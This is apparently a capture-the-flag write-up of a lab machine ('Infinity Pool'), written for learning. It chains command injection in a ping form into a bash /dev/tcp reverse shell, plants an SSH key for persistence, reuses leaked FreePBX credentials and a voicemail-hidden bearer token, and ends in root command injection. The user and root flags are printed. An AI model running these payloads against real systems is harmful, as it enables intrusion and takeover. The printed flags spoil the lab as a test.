# Infinity Pool

Date: August 06, 2026

## Information

- Challenge: [Infinity Pool](https://tryhackme.com/room/hh-infinitypool-5b3548af)
- Category: Boot2Root
- Difficulty: Medium
- Description:

```text
Byte Lotus Hotel promises a seamless stay powered by modern technology. Sometimes the most interesting systems are the ones guests were never meant to see.
```

## Solution

I visit the website and don't see anything interesting at first.

![alt text](Images/image41.png)

I view the page source and find a link to `app.js`.

![alt text](Images/image42.png)

I open the file and see this:

```js
// Byte Lotus front-end bootstrap.
// TODO(ops): the staff connectivity tool at /status posts to the legacy
// /internal/netcheck handler. Keep it out of the public nav until the new
// auth gateway ships. Disallowed in robots.txt for now.
console.log("Stay Noticed\u2122");
```

This comment leaks two useful things: there's a hidden page at `/status`, and it calls an old handler `/internal/netcheck` — a route that's not in the public nav and is blocked in `robots.txt` (but still directly accessible).

I try visiting `/status` in the browser, and it takes me to a "Sister-property connectivity" page, where I can ping any IP address to test the connection.

![alt text](Images/image43.png)

So I try entering:

```bash
8.8.8.8;ls
```

And as expected, `Command Injection` works — the output doesn't just show the `ping` result, it also lists the files in the app's current directory (`app.py`, `requirements.txt`, `static`, `templates`, `venv`, `wsgi.py`). This confirms the `host` input is concatenated directly into a shell command with no sanitization.

![alt text](Images/image44.png)

From this bug, I get RCE like this:

On my machine, I run:

```bash
nc -lvnp 4096
```

On the web form, I enter:

```bash
8.8.8.8; bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4096 0>&1'
```

And I get a successful RCE, with a shell as user `web`.

![alt text](Images/image45.png)

It's not hard to find the user flag at `/home/web/user.txt`.

```bash
cat /home/web/user.txt
```

![alt text](Images/image46.png)

## Privilege Escalation to Root

Now that I have a shell, I list running processes to understand the system's real architecture:

```bash
ps aux
```

![alt text](Images/image47.png)

The three lines below stand out the most:

```bash
web          921  ... /var/www/infinity_pool/edge/venv/bin/python3 ... --bind 0.0.0.0:80 wsgi:app
svc-wat+     936  ... /var/www/infinity_pool/watchtower/venv/bin/python3 ... --bind 127.0.0.1:3000 wsgi:app
root         940  ... /var/www/infinity_pool/automation/venv/bin/python3 ... --bind 127.0.0.1:9000 wsgi:app
```

Besides the `edge` app (public, already exploited), there are two other Flask services that only bind to `127.0.0.1` — meaning only the server itself can reach them, not the outside world:

- `automation` — runs as **root**, port 9000
- `watchtower` — runs as `svc-watch`, port 3000

Since I already have a shell on this machine, I can call both of these "hidden" services directly. I try to read the source code of `automation`/`watchtower` first, but get Access Denied — different owners (`root:root` and `svc-watch:svc-watch`), and user `web` can't read them. So I switch to black-box testing, interacting over HTTP instead.

```bash
curl 127.0.0.1:3000
```

```html
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Watchtower &mdash; ops console</title>
...
</head>
<body>
<header>WATCHTOWER &middot; <span class="muted">internal</span></header>
<main>
  <h1>Surveillance operations</h1>
  <p class="muted">Loopback-only console. Authenticated by network position.</p>
  <div class="tiles">
    <div class="tile"><b>1184</b><span class="muted">active feeds</span></div>
    <div class="tile"><b>OK</b><span class="muted">datastore link</span></div>
    <div class="tile"><b>root</b><span class="muted">automation worker</span></div>
  </div>
  <p class="muted" style="margin-top:28px">
    Service endpoints: <code>/api/health</code> &middot; <code>/api/config</code>
  </p>
</main>
</body>
```

This page announces two endpoints on its own: `/api/health` and `/api/config`. This is a common misconfiguration: the internal system assumes "loopback = safe" so it doesn't bother hiding info. But since I'm also standing on that loopback (via the `web` shell), I get to see it too.

```bash
curl 127.0.0.1:3000/api/config
```

```json
{
    "automation_endpoint":"http://127.0.0.1:9000",
    "note":"internal network only -- do not expose",
    "ops_note":"UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
    "telephony_pass":"St4yN0t1c3d_2026",
    "telephony_portal":"http://127.0.0.1:8080/ucp","telephony_user":"FreePBXUCPTemplateCreator"
}
```

This is credential leakage: the config file exposes credentials for a completely different system — FreePBX UCP (a VoIP switchboard, running on port 8080, matching the `asterisk` processes seen earlier in `ps aux`). The note "still on default template creds — ROTATE" is a clear hint that this is the key I need next.

I check which ports are open and listening:

```bash
ss -tln 2>/dev/null
```

Output:
```bash
State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
LISTEN 0      4096   127.0.0.53%lo:53        0.0.0.0:*          
LISTEN 0      511        127.0.0.1:8080      0.0.0.0:*          
LISTEN 0      10         127.0.0.1:8088      0.0.0.0:*          
LISTEN 0      10         127.0.0.1:8089      0.0.0.0:*          
LISTEN 0      4096         0.0.0.0:22        0.0.0.0:*          
LISTEN 0      80         127.0.0.1:3306      0.0.0.0:*          
LISTEN 0      2048         0.0.0.0:80        0.0.0.0:*          
LISTEN 0      4096      127.0.0.54:53        0.0.0.0:*          
LISTEN 0      2048       127.0.0.1:3000      0.0.0.0:*          
LISTEN 0      10         127.0.0.1:5038      0.0.0.0:*          
LISTEN 0      2048       127.0.0.1:9000      0.0.0.0:*          
LISTEN 0      4096            [::]:22           [::]:*  
```

Port 22 (SSH) is clearly open to the public (`0.0.0.0:22`) — this is very useful, since I can SSH straight into the machine from my attacking machine instead of running everything through `curl` inside the reverse shell, then port-forward the internal ports (8080, 9000, 3000...) so I can use a real browser for the UCP.

Let me check the `.ssh` folder for user `web`:

```bash
ls -la /home/web/.ssh
```

Output:
```bash
total 8
drwxr-xr-x 2 web web 4096 Jun 30 09:23 .
drwxr-x--- 4 web web 4096 Jun 30 09:44 ..
-rw-r--r-- 1 web web    0 Jun 30 09:44 authorized_keys
```

Since `authorized_keys` is empty (0 bytes) and owned by the `web` user itself, I can just plant my own public key there and SSH in without needing the original password.

On my attack machine, I generate a new key pair:

```bash
ssh-keygen -t ed25519 -f ~/.ssh/htb_key -N ""
```

Output:
```bash
Generating public/private ed25519 key pair.
Your identification has been saved in /home/carax49/.ssh/htb_key
Your public key has been saved in /home/carax49/.ssh/htb_key.pub
The key fingerprint is:
SHA256:xtDH4EnxHGWByiaGBnwIcmlIO36Ji6MlcIbsbW21sVs carax49@carax49
The key's randomart image is:
+--[ED25519 256]--+
|+=.o    +..o+.   |
|o.B .  + *.o     |
| + o ...+.=      |
|o.o + oo+.       |
|o+o+ . =S        |
|+o+ . ..+        |
|+o.o o o E       |
|.+. .   o        |
|.      .         |
+----[SHA256]-----+
```

Grab the public key:

```bash
cat ~/.ssh/htb_key.pub
```

Copy the whole line, go back to the web shell, and append it to `authorized_keys`:

```bash
echo "PASTE_PUBLIC_KEY_HERE" >> /home/web/.ssh/authorized_keys
```

Back on my attack machine, I SSH in, forwarding all 4 internal ports (8080, 5038, 9000, 3000) to my own machine:

```bash
ssh -i ~/.ssh/htb_key -L 8080:127.0.0.1:8080 -L 5038:127.0.0.1:5038 -L 9000:127.0.0.1:9000 -L 3000:127.0.0.1:3000 web@<YOUR_LAB_IP>
```

Login succeeds using the key, no password needed.

![alt text](Images/image48.png)

From here, the internal ports are forwarded to my machine, so I can access them directly in a browser instead of using raw `curl`.

## Exploiting FreePBX UCP

Visiting `http://127.0.0.1:8080/ucp/` brings up the FreePBX User Control Panel login page.

![alt text](Images/image49.png)

I log in with the credentials found earlier in `/api/config`:

```text
Username: FreePBXUCPTemplateCreator
Password: St4yN0t1c3d_2026
```

Login succeeds, but the dashboard is completely empty.

![alt text](Images/image50.png)

I create a new dashboard to have somewhere to add a widget:

![alt text](Images/image51.png)

Then I add the **Voicemail** widget — since it shows the voicemail inbox for the `FreePBXUCPTemplateCreator` account itself, it's worth checking for any messages that might leak internal info.

![alt text](Images/image52.png)

Opening the widget, the inbox has exactly one voicemail with a rather unusual CID (Caller ID):

```text
"Automation Key cc_auto_7b3f9a1c4e0d2f6a" <9000>
```

![alt text](Images/image53.png)

The name "Automation Key" and the number `<9000>` match exactly with the `automation` service (running as root, port 9000) that I found earlier via `ps aux`. This must be the secret/token used to authenticate with that service — whoever left it (or the real admin) hid this internal key inside a voicemail's CID field, a fairly sneaky channel, but still readable if you have UCP access.

With this key, I go back to the SSH terminal and call `automation` (port 9000) directly, starting by listing its endpoints through `/health`:

```bash
curl -s http://127.0.0.1:9000/health
```

```json
{
    "endpoints":{
            "GET /health":"service status",
            "POST /jobs/export":{
                "auth":"Authorization: Bearer <automation key>",
                "body":{"report":"<report name>"},
                "desc":"archive the latest data export"
            }
    },
    "runs_as":"root",
    "service":"automation",
    "status":"ok"
}
```

This endpoint documents itself completely, even confirming right away `"runs_as":"root"` — all I need is the Bearer token I just found and the knowledge that the body takes a `report` field, and I can call `POST /jobs/export`.

I try injecting into the `report` field, using the same trick as with `edge`:

```bash
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
-H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
-H 'Content-Type: application/json' --data-binary '{"report":"test;id;"}'
```

Output:
```json
{
    "command":"tar czf /var/automation/exports/test;id;.tgz /var/automation/data 2>&1",
    "output":"uid=0(root) gid=0(root) groups=0(root)\n
    /bin/sh: 1: .tgz: not found\n
    tar: Cowardly refusing to create an empty archive\n
    Try 'tar --help' or 'tar --usage' for more information.\n"
}
```

`uid=0(root)` — confirms Command Injection works, running as **root**. The endpoint builds a command like `tar czf /var/automation/exports/{report}.tgz ...`, and the `report` field is concatenated straight into the shell with no sanitization — the exact same bug as in `edge`, but running as root this time.

No need to grab a reverse shell — I just read the flag directly through the injection:

```bash
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
-H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
-H 'Content-Type: application/json' --data-binary '{"report":"test;cat /root/root.txt;"}'
```

Output:
```json
{
    "command":"tar czf /var/automation/exports/test;cat /root/root.txt;.tgz /var/automation/data 2>&1",
    "output":"THM{tr4c3d_t0_th3_h0r1z0n}\n
    /bin/sh: 1: .tgz: not found\n
    tar: Cowardly refusing to create an empty archive\n
    Try 'tar --help' or 'tar --usage' for more information.\n"
}
```

## Flag
 User flag

 ```text
 THM{n0_v1s1bl3_3dg3}
 ```

 Root flag

 ```text
 THM{tr4c3d_t0_th3_h0r1z0n}
 ```

## Kill Chain

[1] Recon the website → view-source → find a leaked comment in app.js → reveals hidden route /status → /internal/netcheck

[2] Command Injection (host param, unsanitized shell=True) → RCE as user "web" → read user.txt

[3] `ps aux` → find two loopback-only services:
- watchtower (svc-watch, :3000)
- automation (root, :9000)

[4] watchtower /api/config → credential leak → FreePBX UCP creds (telephony_user/pass)

[5] SSH port open to the public + writable authorized_keys → plant attacker's SSH key → port-forward UCP/automation to attack machine

[6] Log in to UCP → add Voicemail widget → voicemail CID holds "Automation Key" (Bearer token for :9000)

[7] automation /health → self-documents POST /jobs/export → the "report" field has the same Command Injection bug as step [2] → but this time runs as root

[8] RCE as root → read root.txt

## What I Learned

1. **Always check view-source** — a forgotten comment in `app.js` leaked a hidden route.
2. **`shell=True` + string interpolation = injection** — the same pattern repeated in both `edge` and `automation`, one bug at two different layers.
3. **"Loopback-only" ≠ safe** — having any shell (even low-privilege) on the box puts you "inside" that boundary.
4. **Credentials often leak across services** — app A's config exposed credentials for a completely different system B.
5. **Check every module, even the ones that seem harmless** — the most important secret was hiding in Voicemail, not somewhere "obvious".
6. **Self-documenting APIs (`/health`) help attackers as much as devs** — without proper auth guards, it's a free exploitation guide.
7. **SSH port-forwarding + a real browser beats raw `curl`** when an app has CSRF tokens and lots of hidden fields.
